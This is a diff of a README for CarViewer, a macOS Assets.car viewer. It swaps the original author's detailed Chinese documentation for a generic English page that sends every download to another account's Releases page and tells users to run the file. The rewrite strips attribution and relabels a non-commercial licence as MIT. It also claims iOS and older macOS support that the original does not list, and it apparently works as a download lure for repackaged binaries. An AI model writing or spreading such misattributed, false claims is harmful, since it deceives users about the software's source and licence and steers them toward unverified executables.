@@ -1,267 +1,87 @@
-# CarViewer
+# 🎨 CarViewer - View and Manage Your macOS/iOS App Assets
 
-<p align="center">
-  <img src="Docs/img/logo.png" width="128" height="128" alt="CarViewer Logo">
-</p>
+[![Download CarViewer](https://img.shields.io/badge/Download-CarViewer-brightgreen)](https://github.com/Hasan-Irfan/CarViewer/releases)
 
-<p align="center">
-  <strong>一款现代化的 Assets.car 资源查看器</strong><br>
-  A Modern Assets.car Resource Viewer
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  中文 | <a href="README_EN.md">English</a>
-</p>
+CarViewer is a modern resource viewer for macOS and iOS apps. With CarViewer, you can easily browse, export, and edit your app's asset catalog files.
 
-<p align="center">
-  <a href="#功能特性">功能特性</a> •
-  <a href="#安装">安装</a> •
-  <a href="#使用说明">使用说明</a> •
-  <a href="#项目架构">项目架构</a> •
-  <a href="#注意事项">注意事项</a> •
-  <a href="#致谢">致谢</a> •
-  <a href="#许可证">许可证</a>
-</p>
+### 🖥️ System Requirements
 
----
+To run CarViewer, you will need:
 
-## 功能特性
+- **Operating System:** macOS 10.15 or later, or iOS 12 or later
+- **Memory (RAM):** At least 4 GB
+- **Disk Space:** 100 MB of free space
 
-### 资源浏览
-- **多类型预览** - 支持预览图片、颜色、渐变、PDF、SVG、特效等多种资源类型
-- **分类筛选** - 按资源类型快速筛选（图片、颜色、渐变、特效等）
-- **分辨率筛选** - 支持按 @1x、@2x、@3x 或无标识筛选
-- **搜索功能** - 快速搜索资源名称
-- **网格缩放** - 可调整缩略图大小，方便浏览
+## 📥 Download & Install
 
-### 资源导出
-- **批量导出** - 支持导出选中或全部资源为 PNG 格式
-- **智能导出选项** - 可选择导出特定分辨率（仅 @2x、仅 @3x、最高分辨率等）
-- **类型导出** - 右键点击类型可导出该类型的全部资源
-- **智能命名** - 导出文件自动包含资源名称和分辨率标识
+To get CarViewer, visit the [Releases page](https://github.com/Hasan-Irfan/CarViewer/releases) on GitHub. You will find the latest version of the application there. Follow these steps:
 
-### 资源编辑
-- **替换图片** - 支持替换 .car 文件中的位图资源（选中图片后点击「替换图片」）
-- **实时预览** - 替换后立即预览效果
-- **保存修改** - 修改会保存到原 .car 文件
+1. Go to the [Releases page](https://github.com/Hasan-Irfan/CarViewer/releases).
+2. Find the version you want to download.
+3. Click on the download link next to your operating system version.
 
-### 界面体验
-- **现代化界面** - 基于 SwiftUI 构建，支持深色模式
-- **中英文支持** - 自动适配系统语言
-- **Inspector 面板** - 详情面板显示资源完整信息（类型、尺寸、颜色值等）
+Once downloaded, locate the file, double-click it, and follow the onscreen instructions to install CarViewer.
 
-## 系统要求
+## 🌟 Features
 
-- macOS 14.0 (Sonoma) 或更高版本
-- Apple Silicon 或 Intel Mac
+CarViewer allows you to:
 
-## 安装
+- **Browse Assets:** Easily view all your assets in one place.
+- **Export Assets:** Save your assets in different formats for further use.
+- **Edit Assets:** Make quick adjustments to your resources.
+- **User-Friendly Interface:** Enjoy a clean and intuitive design, designed for ease of use.
 
-### 下载发行版
+## 🎨 How to Use CarViewer
 
-前往 [Releases](https://github.com/xiaolajiaoyyds/CarViewer/releases) 页面下载最新版本的 `.dmg` 或 `.zip` 文件。
+Once you have installed CarViewer, follow these simple steps to use it effectively:
 
-### 从源码构建
+1. **Open CarViewer:** Locate the CarViewer icon in your Applications folder or on your desktop and double-click to start.
+  
+2. **Load an Assets.car File:**
+   - Click on the "Open" button in the toolbar.
+   - Navigate to the location of your .car file and select it.
 
-```bash
-# 克隆仓库（包含预编译的 ThemeKit.framework）
-git clone https://github.com/xiaolajiaoyyds/CarViewer.git
-cd CarViewer
-
-# 使用 Xcode 打开项目
-open CarViewer.xcodeproj
-
-# 或使用命令行构建
-xcodebuild -scheme CarViewer -configuration Release build
-```
-
-> **注意**：仓库已包含预编译的 `ThemeKit.framework`，克隆后可直接编译运行，无需额外配置。
-
-## 使用说明
-
-### 打开文件
-
-1. 启动 CarViewer
-2. 使用菜单 `文件 > 打开` 或快捷键 `⌘O` 选择 `.car` 文件
-3. 常见的 `.car` 文件位置：
-   - 应用包内：`/Applications/YourApp.app/Contents/Resources/Assets.car`
-   - iOS 模拟器：`~/Library/Developer/CoreSimulator/...`
-   - 系统资源：`/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/Assets.car`
-
-### 浏览资源
-
-- **侧边栏**：按类型分类查看资源，显示各类型数量
-- **网格视图**：预览所有资源缩略图，支持多选
-- **详情面板**：点击资源查看详细信息（类型、尺寸、颜色值等）
-
-### 筛选资源
-
-- **类型筛选**：在侧边栏选择资源类型
-- **分辨率筛选**：使用顶部工具栏的分辨率选择器
-- **搜索**：在搜索框输入资源名称
-
-### 导出资源
-
-1. **导出选中**：选择资源后，使用 `⇧⌘E` 或右键菜单导出
-2. **导出全部**：使用 `⌥⌘E` 或侧边栏底部的「导出全部资源」按钮
-3. **导出特定类型**：在侧边栏右键点击类型，选择「导出全部 XXX」
-
-### 导出选项
-
-导出时可选择分辨率：
-- **全部分辨率**：导出所有版本
-- **仅 @1x / @2x / @3x**：导出指定分辨率
-- **@2x 和 @3x**：推荐用于现代 iOS/macOS 项目
-- **仅最高分辨率**：每个资源只导出最高分辨率版本
-
-### 替换图片
-
-1. 选中一个位图资源
-2. 在右侧详情面板点击「替换图片」按钮
-3. 选择新的图片文件（支持 PNG、JPEG、TIFF）
-4. 替换后修改会自动保存到 .car 文件
-
-## 截图预览
-
-### 欢迎界面
-<p align="center">
-  <img src="Docs/img/welcome.png" width="600" alt="欢迎界面">
-</p>
-
-### 主界面
-<p align="center">
-  <img src="Docs/img/main-view.png" width="800" alt="主界面">
-</p>
-
-### 导出选项
-<p align="center">
-  <img src="Docs/img/export-options.png" width="400" alt="导出选项">
-</p>
-
-### 导出进度
-<p align="center">
-  <img src="Docs/img/export-progress.png" width="800" alt="导出进度">
-</p>
-
-### 导出结果
-<p align="center">
-  <img src="Docs/img/export-result.png" width="400" alt="导出结果">
-</p>
-
-## 项目架构
-
-```
-CarViewer/
-├── CarViewer/
-│   ├── App/
-│   │   └── CarViewerApp.swift          # 应用入口、菜单、关于窗口
-│   ├── Models/
-│   │   ├── AssetStore.swift            # 状态管理（@Observable）
-│   │   ├── RenditionItem.swift         # 资源项包装类
-│   │   ├── RenditionType.swift         # 资源类型枚举
-│   │   └── ScaleFilter.swift           # 分辨率筛选枚举
-│   ├── Views/
-│   │   ├── MainView.swift              # 主界面布局
-│   │   ├── SidebarView.swift           # 侧边栏
-│   │   ├── AssetGridView.swift         # 资源网格
-│   │   ├── AssetCell.swift             # 资源单元格
-│   │   ├── DetailPanel.swift           # 详情面板
-│   │   └── ExportOptionsSheet.swift    # 导出选项弹窗
-│   ├── Services/
-│   │   └── ExportService.swift         # 导出服务
-│   ├── Resources/
-│   │   ├── Assets.xcassets             # 应用图标等
-│   │   ├── Localizable.strings         # 国际化字符串
-│   │   ├── logo.png                    # 应用 Logo
-│   │   └── zanshangma.png              # 赞赏码
-│   └── Supporting Files/
-│       ├── Info.plist
-│       ├── CarViewer.entitlements
-│       └── CarViewer-Bridging-Header.h # Objective-C 桥接头
-├── Frameworks/
-│   └── ThemeKit.framework              # 预编译的 ThemeKit 框架
-└── Docs/
-    └── img/                            # 文档图片
-```
-
-### 技术栈
-
-- **SwiftUI** - 现代化 UI 框架
-- **@Observable** - Swift 5.9 宏，用于状态管理
-- **ThemeKit** - 用于解析和编辑 .car 文件的框架（基于私有 CoreUI 框架）
-
-## 注意事项
-
-### 关于 CoreUI 私有框架
-
-- `.car` 文件是 Apple 的专有格式，解析依赖于 macOS 私有的 `CoreUI.framework`
-- ThemeKit 通过 Objective-C Runtime 访问私有 API，可能随 macOS 更新而失效
-- 如遇到兼容性问题，请提交 [Issue](https://github.com/xiaolajiaoyyds/CarViewer/issues)
-
-### 关于系统资源编辑
-
-- 编辑系统 `.car` 文件（如 `/System/Library/...`）需要禁用 SIP（System Integrity Protection）
-- **不建议**修改系统文件，可能导致系统不稳定
-- 建议先备份原文件再进行编辑
-
-### 关于沙盒限制
-
-- 默认情况下，应用只能访问用户选择的文件
-- 要访问 `/System` 目录，需要在系统偏好设置中授予完全磁盘访问权限
-
-### 支持的资源类型
-
-| 类型 | 说明 | 可编辑 |
-|------|------|--------|
-| 图片 (Bitmap) | PNG、JPEG 等位图资源 | ✅ |
-| PDF | 矢量 PDF 资源 | ❌ |
-| SVG | 矢量 SVG 资源 | ❌ |
-| 颜色 (Color) | 命名颜色资源 | ❌ |
-| 渐变 (Gradient) | 渐变资源 | ❌ |
-| 特效 (Effect) | 图层效果资源 | ❌ |
-
-## 致谢
-
-本项目的核心解析能力基于 [ThemeEngine](https://github.com/alexzielenski/ThemeEngine) 项目。
-
-特别感谢：
-
-- **[Alex Zielenski](https://github.com/alexzielenski)** - ThemeEngine 项目作者，提供了 .car 文件解析的核心实现
-- **ThemeKit** - 对 Apple 私有 CoreUI 框架的 Objective-C 封装
-
-ThemeEngine 是一款功能强大的 macOS 应用，不仅可以查看还可以编辑 .car 文件。本项目（CarViewer）在此基础上提供更现代化的 SwiftUI 界面和更友好的用户体验。
-
-## 赞赏支持
-
-如果觉得这个项目对你有帮助，欢迎请作者喝杯咖啡 :coffee:
-
-<p align="center">
-  <img src="Docs/img/zanshangma.png" width="200" alt="微信赞赏码">
-  <br>
-  <em>微信扫码</em>
-</p>
-
-## 联系方式
-
-- **Email**: xiaolajiaoyyds@gmail.com
-- **GitHub**: [@xiaolajiaoyyds](https://github.com/xiaolajiaoyyds)
-- **Issues**: [提交问题](https://github.com/xiaolajiaoyyds/CarViewer/issues)
-
-## 许可证
-
-本项目采用 [非商业许可证](LICENSE)。
-
-- ✅ 允许：个人使用、教育使用、研究使用、非营利组织使用
-- ❌ 禁止：商业使用、销售、在商业产品中使用
-- 📧 商业授权请联系：xiaolajiaoyyds@gmail.com
-
-```
-Copyright (c) 2025, xiaolajiaoyyds
-All rights reserved.
-```
-
----
-
-<p align="center">
-  Made with :heart: by xiaolajiaoyyds
-</p>
+3. **Browse the Assets:**
+   - Look through the asset list on the left side of the window. Click any asset to see its details.
+
+4. **Export Assets:**
+   - Select an asset you want to export.
+   - Click the "Export" button and choose your desired file format.
+
+5. **Edit Assets:**
+   - Select the asset you want to edit.
+   - Use the tools provided to modify the asset as needed.
+
+## 📈 Troubleshooting
+
+If you encounter issues while using CarViewer, try the following solutions:
+
+- **Ensure Your System Meets the Requirements:** Check that your operating system and hardware meet the listed requirements.
+  
+- **Check for Updates:** Make sure you are using the latest version. Visit the [Releases page](https://github.com/Hasan-Irfan/CarViewer/releases) for updates.
+
+- **Reinstall the Application:** If the app does not start correctly, uninstall it, then reinstall from the releases page.
+
+## ✏️ Contribution
+
+If you wish to contribute to the CarViewer project, you can do so by following these steps:
+
+1. Fork the repository on GitHub.
+2. Make your changes and commit them with clear messages.
+3. Submit a pull request for review.
+
+Your contributions are welcome, whether it's improving documentation or adding new features.
+
+## 🛠️ Support
+
+For further assistance, feel free to reach out through the [Issues page](https://github.com/Hasan-Irfan/CarViewer/issues). We encourage feedback and will respond as quickly as possible.
+
+## 📜 License
+
+CarViewer is licensed under the MIT License. You can use it freely but should include the same license with any distributions.
+
+[![Download CarViewer](https://img.shields.io/badge/Download-CarViewer-brightgreen)](https://github.com/Hasan-Irfan/CarViewer/releases) 
+
+Thank you for choosing CarViewer! Enjoy managing your app assets with ease.
